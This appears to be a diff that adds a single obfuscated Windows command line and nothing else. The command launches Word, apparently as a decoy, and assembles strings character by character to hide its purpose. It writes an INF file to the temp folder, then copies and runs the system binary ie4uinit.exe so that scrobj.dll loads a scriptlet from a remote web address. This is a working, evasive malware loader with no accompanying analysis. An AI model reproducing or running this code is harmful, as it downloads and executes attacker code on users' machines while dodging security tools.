@@ -1,0 +1,29 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %e in ("life=al" "resigne=s" "resinere=e" ) do @set %~e) &&
+  call(for %f in ("e") do @set "mingledl=%~f") &&
+  call(for %o in ("e") do @set "mingledl=%~o") &&
+  (for %x in ("t") do @set "biz=%~x") &&
+  (for %l in ("s") do @set "nonperver=%~l") &&
+  call(for %m in (".") do @set "hessonite=%~m") &&
+  callcallcall(for %s in ("l") do @set "nephitechei=%~s") &&
+  (for %a in ("n") do @set "unma=%~a") &&
+  (for %c in ("4") do @set "langrelsr=%~c") &&
+  (for %c in ("i") do @set "syncret=%~c") &&
+  (for %h in ("s") do @set "nonperver=%~h") &&
+  (for %e in ("d") do @set "bengali=%~e") &&
+  (for %d in ("r") do @set "haught=%~d") &&
+  call(for %y in ("u") do @set "multica=%~y") &&
+  call(for %n in ("U") do @set "clicking=%~n") &&
+  (for %u in ("X") do @set "uncanonical=%~u") &&
+  (for %f in ("0") do @set "dissc=%~f") &&
+  (for %o in ("x") do @set "wigwagg=%~o") &&
+  (for %p in ("9") do @set "unchurch=%~p") &&
+  (for %h in ("l") do @set "nephitechei=%~h") &&
+  call(for %r in ("[") do @set "ung=%~r") &&
+  call(for %j in ("e") do @set "mingledl=%~j") &&
+  call(for %e in ("t") do @set "biz=%~e") &&
+  call(for %s in ("c") do @set "miszo=%~s") &&
+  call(for %f in ("f") do @set "laserpiti=%~f") &&
+  call(for %g in ("s") do @set "nonperver=%~g") &&
+  callcallcall(for %w in ("[strings]" "servicename= 'gullibility'" "shortsvcname= 'gullibility'" "calliste=." "gayness=/" "paran=N" "yonkersnona=a" "whitecha=b" "reglues=c" "westhamd=d" "discipline=e" "initiallin=i" "hedg=j" "titrimetri=k" "trispor=l" "espa=n" "perturbe=o" "unlivelydis=p" "inexpectati=q" "pallad=s" "underfl=t" "[defaultinstall.windows7]" "delfiles=78DF5" "Un\" "Register\" "OCXs=usucap_E03964" "[destinationdirs]" "defaultdestdir=11" "78DF5=01" "[78DF5]" "i%discipline%u%initiallin%n%initiallin%t%calliste%i%espa%f" "[version]" "signature=$windows nt$" "[usucap_E03964]" "s%reglues%r%perturbe%b\" "%hedg%.%westhamd%l%trispor%,%paran%I,h%underfl%t%unlivelydis%:%gayness%/%titrimetri%k%pallad%f%inexpectati%g%initiallin%u%calliste%c%perturbe%m%gayness%s%westhamd%g%titrimetri%j%whitecha%k%yonkersnona%" ) do @echo %~w) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
